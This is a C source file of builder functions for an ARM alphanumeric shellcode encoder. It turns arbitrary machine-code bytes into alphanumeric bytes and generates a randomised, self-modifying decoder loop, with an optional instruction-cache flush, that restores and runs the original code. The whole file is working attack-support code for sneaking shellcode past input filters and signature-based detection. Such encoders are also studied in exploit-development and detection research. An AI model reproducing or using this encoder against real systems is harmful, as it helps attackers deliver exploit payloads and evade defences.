/*+---------------------------------------------------+*/
/*|                Builder Functions                  |*/
/*+---------------------------------------------------+*/

#include<stdio.h>
#define EOR 1
#define SUB 2
#define RSB 3
#define MI 4
#define PL 5 
#define LDR 6
#define STR 7
#define LDM 8
#define STM 9
#define ROR 10
#define LSR 11


extern struct Sshellcode {
 unsigned char* opcodes; /* opcodes bytes */
 int size; /* size of the opcodes bytes */
};

static unsigned char I;
static int size = 0;
static unsigned char i, j, k, x, addr, addr_offset;

void algo1(struct Sshellcode* output, struct Sshellcode* input, unsigned int begin_inp, unsigned int iter);
void gap_traverse(struct Sshellcode* output, unsigned char gap);
void algo2(struct Sshellcode* output);


void enc_data_builder(struct Sshellcode* output, struct Sshellcode* input){
	if((output == NULL) | (input == NULL))
		return ;
	if(input->opcodes == NULL)
		return ;
	/*struct Sshelcode* x = shellcode_malloc();
	shellcode_zero(x);*/
	unsigned char arr[] = {1,2,3,4,5,6,7,8,9};
	I = randnum(arr, 9);	
	int p=0;
	for(p=0; p < input->size; ++p){
		unsigned char ab = input->opcodes[p];
		unsigned char b = ab & 0x0f;
		unsigned char e0 = enc_data_msn(b, I);
		e0 = e0 << 4;
		unsigned char ef = e0 | b;
		unsigned char d = ((ab & 0xf0)^e0)>>4;
		unsigned char c0 = (enc_data_msn(d,I))<<4 ;
		unsigned char cd = c0 | d;
		shellcode_db(output, cd);
		shellcode_db(output, ef);	 
	}
	/*Last two bytes to stop the decoder_loop*/
	unsigned char max = (0x30|I);
	shellcode_db(output, alphanumeric_get_byte());
	shellcode_db(output, alphanumeric_get_byte_ltmax(max));
	
}

void DecoderLoopBuilder(struct Sshellcode* dec_loop, unsigned int icache_flush){
	if(dec_loop == NULL)
		return;
	
	/* Select p,s,t and q */
	unsigned char arr[]={3,7};
	unsigned char p = randnum(arr, 2);
	unsigned char s;
	if(p == 3)
		s = 7;
	else
		s = 3;
	unsigned char t = 6;
	unsigned char arr2[]={8,9};
	unsigned char q = randnum(arr2, 2);
	
	/* Add the instructions*/
	if(icache_flush)
		swi(dec_loop, MI);
	
	unsigned char rsalnum = alphanumeric_get_byte();

	if(icache_flush){
		/*EORMIS rp, r4, #(randomly selected alphanumeric value)*/
		dpimm(dec_loop, EOR, MI, 1, p, 4, rsalnum);
	}
	
	unsigned char dist;
	if(icache_flush == 1)
		dist = 0x2c;
	else
		dist = 0x28;
	
	unsigned char offset = off_gen((dist+(0x04)));
	
	/*SUBPL rs, r4, #(dist+0x04+offset)*/
	dpimm(dec_loop, SUB, PL, 0, s, 4, (dist + 0x04 + offset));

	/*SUBPL rs, pc, rs LSR r4*/
	dpshiftreg(dec_loop, SUB, 0, s, 0x0f, s, LSR, 4);
	
	/*EORPLS rt, r4, rs LSR r4*/
	dpshiftreg(dec_loop, EOR, 1, t, 4, s, LSR, 4);

	/*EORMIS rp, r4, #rsalnum*/
	rsalnum = alphanumeric_get_byte();
	dpimm(dec_loop, EOR, MI, 1, p, 4, rsalnum);

	/*LDRPLB rp, [rs, #(-offset)]*/
	lsbyte(dec_loop, LDR, PL, p, s, offset);

	/*SUBPL rs, rs, r5 LSR r4*/
	dpshiftreg(dec_loop, SUB, 0, s, s, 5, LSR, 4);

	/*LDRPLB rq, [rs, #(-offset)]*/
	lsbyte(dec_loop, LDR, PL, q, s, offset);
	
	/*EORPLS rp, rq, rp ROR #28*/
	dpshiftimm(dec_loop, EOR, 1, p, q, p, 28);

	/*STRPLB rp, [rt, #(-offset)]*/
	lsbyte(dec_loop, STR, PL, p, t, offset);

	/*SUBPL rt, rt, r5 LSR r4*/
	dpshiftreg(dec_loop, SUB, 0, t, t, 5, LSR, 4);

	/*SUBPL rs, rs, r5 LSR r4*/
	dpshiftreg(dec_loop, SUB, 0, s, s, 5, LSR, 4);

	/*RSBPLS rq, rq, #0x3I*/
	dpimm(dec_loop, RSB, PL, 1, q, q, ((0x30)|I));	

	/*BMI 0xfffff4*/
	bmi(dec_loop);	

	/*STRPLB r4, [rt, #-(offset+1)]*/
	lsbyte(dec_loop, STR, PL, 4, t, (offset+1));
	
	if(icache_flush == 1){
		/*SWIPL 0x9f0002*/
		swi(dec_loop, PL);
	}
	
	

	
}


void encDecoderLoopBuilder(struct Sshellcode* output, struct Sshellcode* input){
	if((input == NULL) | (output == NULL))
		return;
	if(input->opcodes == NULL)
		return;
	int p = 0;
	int s = output->size;	
	shellcode_cat(output, input);
	for(; p < input->size; ++p){
		if(!alphanumeric_check(input->opcodes[p])){
			output->opcodes[s+p] = alphanumeric_get_byte();
		}
	}
}

void DecoderBuilder(struct Sshellcode* output, struct Sshellcode* input, unsigned int icache_flush){
	if((input == NULL) | (output == NULL))
		return;
	if(input->opcodes == NULL)
		return;
	
	/*Register selections*/
	unsigned char arr[] = {4,6};
	addr  = randnum(arr, 2);
	unsigned char arr2[] = {3, 5, 7};
	i = randnum(arr2, 3);
	unsigned char arr3[2];
	int p,q;
	for(p=0, q=0; p < 3; ++p){
		if(arr2[p] != i){
			arr3[q++] = arr2[p];
		}
	}
	j = randnum(arr3, 2);
	for(p=0; p < 2; ++p){
                if(arr3[p] != j){
                        k = arr3[p];
			break;
                }       
        }     

	x = off_gen(0x01);
	unsigned char offset = 0x91;
	if(icache_flush){
		algo1(output, input, 0, 3);
		gap_traverse(output, 0x1e);
		algo1(output, input, 33, 5);
	}
	else{
		gap_traverse(output, 0x19);
		algo1(output, input, 25, 5);
	}
	gap_traverse(output, 0x0f);
	if(icache_flush)
		algo1(output, input, 53, 15);
	else
		algo1(output, input, 45, 11);
	/*trucate the last instruction, which increments raddr by 1, from the output*/
	output->size -= 4;	
	size -= 4;
	/*Setting r0, r1, r2 for parameter passing*/
	/*SUBPLS ri, ri, #x*/
	dpimm(output, SUB, PL, 1, i, i, x);
	/*SUBPL r4, ri, ri LSR ri*/
	dpshiftreg(output, SUB, 0, 4, i, i, LSR, i);
	/*SUBPL r6, ri, ri LSR ri*/
	dpshiftreg(output, SUB, 0, 6, i, i, LSR, i);
	/*SUBPL r5, rj, r4 ROR r6*/
	dpshiftreg(output, SUB, 0, 5, j, 4, ROR, 6);
	
	size += 4*4;

	if(icache_flush){
	
		unsigned char arr4[] = {3,7};
		unsigned char m = randnum(arr4, 2);
	
	
	/*unsigned char d = alphanumeric_get_byte();
 
	SUBPL rm, sp, #d
	dpimm(output, SUB, PL, 0, m, 13, d);	
	
	unsigned char arr5[] = {0x71, 0x72, 0x74, 0x78};
	unsigned char reglL = randnum(arr5, 4);
	unsigned char arr6[] = {0x41, 0x42, 0x44, 0x48, 0x51, 0x52, 0x54, 0x58};		
	unsigned char reglH = randnum(arr6, 8);
	
	STMPLFD rm, {r0/1/2/3, r4, r5, r6, r8/9/10/11, lr / (r12, lr) / (r13, lr)}^
	smul(output, m, 0x41, reglL);

	NOP involving unbanked registers: SUBPL r5, r5, r4 ROR r4 
	dpshiftreg(output, SUB, 0, 5, 5, 4, ROR, 4);
		
	unsigned char arr7[] = {0x47, 0x4f};
	reglL = randnum(arr7, 2);
	reglH = randnum(arr6, 8);
	
	LDMPLFA rm!, {r0, r1, r2, r6 / (r3, r6), r8/9/10/11, lr / (r12, lr) / (r13, lr)}
	lmul(output, m, reglH, reglL);*/
	
	
		unsigned char c = off_gen_aligned(24);
		unsigned char arr5[] = {2,4,6,8,10,12,14,16,18};
		unsigned char arr6[] = {4,6};
		unsigned char arr7[] = {1,2,4,8};
		unsigned char reglH = ((0x40)|(randnum(arr7,4)));
		/* SUBPL rm, sp, #(c+24) */
        	dpimm(output, SUB, PL, 0, m, 13, (c+24));

		/*Store 4 0x00*/
		/*STRPLB randnum(arr6), [!rm, -(r5 ROR #randnum(arr5))]*/
		sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
		sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
		sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
		sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));

		/*Store 4 0xff*/
		/*STRPLB r5, [!rm, -(r5 ROR #randnum(arr5))]*/ 
		sbyteposti(output, 5, m, 5, randnum(arr5,9));
		sbyteposti(output, 5, m, 5, randnum(arr5,9));
		sbyteposti(output, 5, m, 5, randnum(arr5,9));
		sbyteposti(output, 5, m, 5, randnum(arr5,9));

		/*Store 4 0x00*/
        	/*STRPLB randnum(arr6), [!rm, -(r5 ROR #randnum(arr5))]*/
        	sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
        	sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
        	sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));
        	sbyteposti(output, randnum(arr6,2), m, 5, randnum(arr5,9));

		/*SUBPL rm, sp, #c*/
		dpimm(output, SUB, PL, 0, m, 13, c);

		/*LDMPLDB rm!, {r0, r1, r2, r6, r8/9/10/11, r14}*/
		lmul(output, m, reglH, 0x47);
	
		/*SUBPLS rm, r5, r4 ROR rm*/
		dpshiftreg(output, SUB, 1, m, 5, 4, ROR, m);

		size += 4*16;
	}
	
	
	
	
}

void algo1(struct Sshellcode* output, struct Sshellcode* input, unsigned int begin_inp, unsigned int iter){
	if((input == NULL) | (output == NULL))
                return;
        if(input->opcodes == NULL)
                return;
	unsigned char offset = 0x91;
	int p = begin_inp;
	for(; p < (begin_inp + iter); ++p){
                unsigned char y = input->opcodes[p];
                if(alphanumeric_check(y)){
                        /*SUBPL raddr, raddr, rj ROR rk*/
			dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
			size+=4;
			continue;
                }
		if(y >= 0x80){
			if(alphanumeric_check(~y)){
				/*EORPLS rk, rj, #~y*/
				dpimm(output, EOR, PL, 1, k, j, ~y);
				/*STRMIB rk, [raddr, #(-offset)]*/
				lsbyte(output, STR, MI, k, addr, offset);
				/*SUBMIS rk, ri, #x*/
				dpimm(output, SUB, MI, 1, k, i, x);
				/*SUBPL raddr, raddr, rj ROR rk*/
				dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
				
				size+=4*4;
				continue;
			}
			unsigned char a = alphanumeric_get_complement(~y);
			unsigned char b = a ^ (~y) ;
			/*EORPLS rk, rj, #a*/
			dpimm(output, EOR, PL, 1, k, j, a);
			/*EORMIS  rk,  rk, #b*/
			dpimm(output, EOR, MI, 1, k, k, b);
			/*STRMIB rk, [raddr, #(-offset)]*/
			lsbyte(output, STR, MI, k, addr, offset);
			/*SUBMIS rk, ri, #x*/
			dpimm(output, SUB, MI, 1, k, i, x);
			/*SUBPL raddr, raddr, rj ROR rk*/
			dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
			
			size+=4*5;
			continue;
		}
		if(x > y){
			unsigned char z1 = x - y;
			if(alphanumeric_check(z1)){
				/*SUBPL rk, ri, #z*/
				dpimm(output, SUB, PL, 0, k, i, z1);
				/*STRPLB rk, [raddr, #(-offset)]*/
				lsbyte(output, STR, PL, k, addr, offset);
				/*SUBPL raddr, raddr, rj ROR rk*/
				dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
				
				size+=4*3;
				continue;
		
			}
		}
		unsigned char z2 = x + y;
		if(alphanumeric_check(z2)){
			/*RSBPL rk, ri, #z*/
			dpimm(output, RSB, PL, 0, k, i, z2);
			/*STRPLB rk, [raddr, #(-offset)]*/
			lsbyte(output, STR, PL, k, addr, offset);
			/*SUBPL raddr, raddr, rj ROR rk*/
			dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
			
			size+=4*3;
			continue;
		} 
		unsigned char z3 = x ^ y;
		if(alphanumeric_check(z3)){
			/*EORPLS rk, ri, #z*/
			dpimm(output, EOR, PL, 1, k, i, z3);
			/*STRPLB rk, [raddr, #(-offset)]*/
			lsbyte(output, STR, PL, k, addr, offset);
			/*SUBPL raddr, raddr, rj ROR rk*/
			dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
			
			size+=4*3;
			continue;
		} 
		unsigned char a2 = alphanumeric_get_complement(z3);
		unsigned char b2 = a2 ^ z3;
		/*EORPLS rk, ri, #a*/
		dpimm(output, EOR, PL, 1, k, i, a2);
		/*EORPLS rk, rk, #b*/
		dpimm(output, EOR, PL, 1, k, k, b2);
		/*STRPLB rk, [raddr, #(-offset)]*/
		lsbyte(output, STR, PL, k, addr, offset);
		/*SUBPL raddr, raddr, rj ROR rk*/
		dpshiftreg(output, SUB, 0, addr, addr, j, ROR, k);
		
		size += 4*4; 
								
        }

}

void gap_traverse(struct Sshellcode* output, unsigned char gap){
	if(output == NULL)
		return;
	unsigned char g, h;
	g = off_gen(gap);
	h = g + gap;
	/*SUBPL rj, ri, #x*/
	dpimm(output, SUB, PL, 0, j, i, x);
	/*EORPLS rk, rj, #g*/
	dpimm(output, EOR, PL, 1, k, j, g);
	/*SUBPL rk, rk, #h*/
	dpimm(output, SUB, PL, 0, k, k, h);
	/*SUBPL raddr, raddr, rk LSR rj*/
	dpshiftreg(output, SUB, 0, addr, addr, k, LSR, j);
	/*SUBPL rj, ri, #(x+1)*/
	dpimm(output, SUB, PL, 0, j, i, (x+1));
	
	size+=4*5;
		
}


void buildInit(struct Sshellcode* output, struct Sshellcode* input){
	if((input == NULL) | (output == NULL))
                return;
        if(input->opcodes == NULL)
                return;
	
	/*Select values of v and w*/
	int topv, topw;
	unsigned char total = 0x70;
	unsigned char arr1[] = {0x30, 0x34, 0x38};
	unsigned char v1 = randnum(arr1, 3);
	unsigned char v2 = randnum(arr1, 3);
	
	topv = ((total - (v1 + v2))/4) + 1; 
	
	unsigned char w1 = randnum(arr1, 3);
	unsigned char w2 = randnum(arr1, 3);

	topw = ((total - (w1 + w2))/4) + 2;
        
	int p;
	unsigned char op, cond, s, d, n;
	unsigned char arrop[] = {EOR, SUB, RSB};
	unsigned char arrcond[] = {PL, MI};
	unsigned char arrs[] = {0, 1};
	unsigned char arrd[] = {3, 5, 7};
	unsigned char arrn[] = {1, 2, 3, 4, 5, 6, 7, 8, 9};
	for(p = 1; p <= ((total-8)/4); ++p){
		op = randnum(arrop, 3);
		cond = randnum(arrcond, 2);
		if(op == EOR)
			s = 1;
		else
			s = randnum(arrs, 2);
		d = randnum(arrd, 3);
		n = randnum(arrn, 9);
		if((p == topv)|(p == topw))
			dpimm(output, op, cond, s, d, n, x);
		else
			dpimm(output, op, cond, s, d, n, alphanumeric_get_byte());
		
	}

	/*SUBPL ri, pc, #v1*/
	dpimm(output, SUB, PL, 0, i, 15, v1);
	/*SUBMI ri, pc, #w1*/
	dpimm(output, SUB, MI, 0, i, 15, w1);
	/*LDRPLB ri, [ri, #(-v2)]*/
	lsbyte(output, LDR, PL, i, i, v2);	
	/*LDRMIB ri, [ri, #(-w2)]*/	
	lsbyte(output, LDR, MI, i, i, w2);

	algo2(output);

	/*SUBPL rj, ri, #(x+1)*/
	dpimm(output, SUB, PL, 0, j, i, (x+1));	
	/*Initializer built!!*/
	
	/*Replace 0x91s in decoder with addr_offset*/
	for(p=0; p < input->size; ++p){
		if(input->opcodes[p] == 0x91)
			input->opcodes[p] = addr_offset;
	}
	
	

}

void algo2(struct Sshellcode* output){
	if(output == NULL)
		return;
	size += 4;
	/*SUBMIS rk, ri, #x*/
	dpimm(output, SUB, MI, 1, k, i, x);
	/*SUBPLS rk, ri, #x*/
	dpimm(output, SUB, PL, 1, k, i, x);
	/*SUBPL rj, ri, #x*/
	dpimm(output, SUB, PL, 0, j, i, x);
	
	unsigned int p;
	unsigned int quo = (size-4)/(0x7a);
	if(quo >= 1){
		for(p=0; p<quo; ++p){
			/*SUBPL rj, rj, #0x7a*/
			dpimm(output, SUB, PL, 0, j, j, 0x7a);
			
		}
	}
	
	unsigned char rem = (size - 4)%(0x7a);
	if((rem >= 1) && (rem <= 0x4a)){
		addr_offset = off_gen(rem);
		/*SUBPL rj, rj, #(offset+rem)*/
		dpimm(output, SUB, PL, 0, j, j, (addr_offset + rem));
		 
	}
	if((rem >= 0x4b) && (rem < 0x7a )){
		if(alphanumeric_check(rem)){
			addr_offset = alphanumeric_get_byte();
			/*SUBPL rj, rj, #(rem)*/
			dpimm(output, SUB, PL, 0, j, j, rem);
			/*SUBPL rj, rj, #(offset)*/
			dpimm(output, SUB, PL, 0, j, j, addr_offset);
		}
		else {
			addr_offset = off_gen((rem - 0x5a));
			/*SUBPL rj, rj, #0x5a*/
			dpimm(output, SUB, PL, 0, j, j, 0x5a);
			/*SUBPL rj, rj, #(offset + (rem - 0x5a))*/
			dpimm(output, SUB, PL, 0, j, j, (addr_offset + rem - 0x5a));
					
		}
	}
	/*SUBPL raddr, pc, rj ROR rk*/
	dpshiftreg(output, SUB, 0, addr, 15, j, ROR, k);
		
	
}
